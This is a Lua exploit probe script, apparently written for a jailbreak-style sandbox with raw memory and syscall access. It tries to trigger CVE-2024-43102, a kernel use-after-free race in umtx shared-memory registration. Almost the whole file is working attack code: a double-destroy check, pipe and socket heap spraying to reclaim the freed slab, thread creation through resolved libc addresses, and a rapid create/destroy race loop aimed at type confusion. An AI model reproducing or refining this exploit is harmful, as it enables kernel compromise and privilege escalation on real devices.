-- CRASH_CLASS: HIGH
-- PROBE 152c: Threaded SHM UAF — CVE-2024-43102 race exploit
--
-- Context: 152b CONFIRMED:
--   - Double-destroy returns 0 on both destroys (no error)
--   - alive() returns 0 after destroy (dangling reference)
--   This is the CVE-2024-43102 signature on 14.10.
--
-- Strategy: Use Thrd_create for concurrent threads:
--   Thread 1 (main): Rapid SHM create/destroy on same key
--   Thread 2 (spawned): Allocate objects (pipes/sockets) to reclaim freed SHM slab
--   Race window: between destroy freeing the slab and create checking it
--   Goal: reclaimed slab contains controllable data → type confusion
--
-- The actual CVE-2024-43102 race is in umtx_shm_create_reg():
--   reg = umtx_shm_find_reg(key)  ← finds existing registration
--   [RACE WINDOW: another thread calls unref_reg, refcount→0, freed]
--   refcount_acquire(reg)          ← UAF: increments freed memory

print("=== PROBE 152c: THREADED SHM UAF ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

collectgarbage("stop")
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)

-- ============================================================
-- SECTION A: Check threading primitives
-- ============================================================
print("")
print("--- SECTION A: THREAD PRIMITIVES ---")

local has_threads = false
local tc_addr, af_addr, tj_addr

if libc_addrofs then
    tc_addr = libc_addrofs.Thrd_create
    af_addr = libc_addrofs.Atomic_fetch_add_8
    tj_addr = libc_addrofs.Thrd_join
    if tc_addr then
        has_threads = true
        print("Thrd_create=" .. tostring(tc_addr))
        print("Atomic_fetch_add=" .. tostring(af_addr))
        print("Thrd_join=" .. tostring(tj_addr))
    end
else
    print("libc_addrofs not available")
end

-- ============================================================
-- SECTION B: Single-thread baseline — confirm double-destroy
-- ============================================================
print("")
print("--- SECTION B: DOUBLE DESTROY BASELINE ---")

local key = memory.alloc(0x20)

-- Test: create, destroy, destroy, alive
memory.write_qword(key, uint64(0xAAAA0001))
local ok_c, rc = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
print("create: " .. (ok_c and to_num(rc) or "fail"))

local ok_d1, rd1 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
print("destroy1: " .. (ok_d1 and to_num(rd1) or "fail"))

local ok_d2, rd2 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
print("destroy2: " .. (ok_d2 and to_num(rd2) or "fail"))

local ok_a, ra = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("alive_after_dd: " .. (ok_a and to_num(ra) or "fail"))

-- ============================================================
-- SECTION C: Pipe-based heap spray for slab reclaim
-- ============================================================
print("")
print("--- SECTION C: PIPE SPRAY + SHM RECLAIM ---")

-- Strategy: destroy SHM, then spray pipe buffers to reclaim the slab
-- Check if pipe via make_syscall works on this instance
local sc_pipe2 = make_syscall(42)
local pipe_buf = memory.alloc(16)
local ok_pipe, rp = pcall(function()
    return sc_pipe2(uint64(to_num(pipe_buf)))
end)
local pipe_rv = ok_pipe and to_num(rp) or -999
local fd_rd = safe_rd(pipe_buf)
local fd_wr = safe_rd(pipe_buf + 4)
print(string.format("pipe: ret=%d rd_fd=%s wr_fd=%s", pipe_rv, tostring(fd_rd), tostring(fd_wr)))

-- Try socket instead (more reliable)
local sc_socket = make_syscall(97)
local ok_sock, rs = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(0))  -- AF_INET, SOCK_STREAM, 0
end)
local sock_fd = ok_sock and to_num(rs) or -1
print("socket: fd=" .. sock_fd)

-- ============================================================
-- SECTION D: Threaded race if available
-- ============================================================
print("")
print("--- SECTION D: THREADED RACE ---")

if has_threads and af_addr then
    -- Shared state for the race
    local race_counter = memory.alloc(0x40)
    memory.write_qword(race_counter, uint64(0))
    -- Thread will increment this counter rapidly
    -- Thrd_create(thr_buf, func, arg): func=Atomic_fetch_add_8, arg=counter
    -- The thread will add 1 to *counter atomically in a loop

    -- Spawn 2 worker threads
    local threads = {}
    for i = 1, 2 do
        local ok_t, tid = pcall(function()
            return native.fcall_with_rax(tc_addr, race_counter, af_addr, race_counter)
        end)
        if ok_t then
            threads[#threads + 1] = tid
            print("thread " .. i .. ": tid=" .. tostring(tid))
        else
            print("thread " .. i .. " FAILED: " .. tostring(tid))
        end
    end

    -- While threads are running, do rapid SHM create/destroy
    -- The threads create kernel objects (stacks, thread structures)
    -- that may reclaim freed SHM slabs
    local race_cycles = 0
    for i = 1, 50 do
        memory.write_qword(key, uint64(0xBACE0000 + i))

        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
        end)
        -- Double destroy in quick succession
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
        race_cycles = race_cycles + 1
    end
    print("race_cycles=" .. race_cycles)

    -- Join threads
    for _, tid in ipairs(threads) do
        pcall(function() native.fcall_with_rax(tj_addr, tid, uint64(0)) end)
    end
    print("threads joined")

    -- Check counter
    local ctr = safe_rq(race_counter)
    print("race_counter=" .. tostring(ctr))
else
    print("SKIP: no threading — doing single-thread double-destroy churn")
    for i = 1, 50 do
        memory.write_qword(key, uint64(0xBACE0000 + i))
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
        end)
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
    end
    print("single-thread churn done")
end

-- ============================================================
-- SECTION E: Post-race alive check
-- ============================================================
print("")
print("--- SECTION E: POST-RACE STATE ---")

-- Check if any of the race keys have dangling refs
local alive_post = 0
for i = 1, 10 do
    memory.write_qword(key, uint64(0xBACE0000 + i))
    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    if ok and to_num(ret) == 0 then alive_post = alive_post + 1 end
end
print("alive_post_race=" .. alive_post .. "/10")

-- Check canary
print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 152c COMPLETE ===")
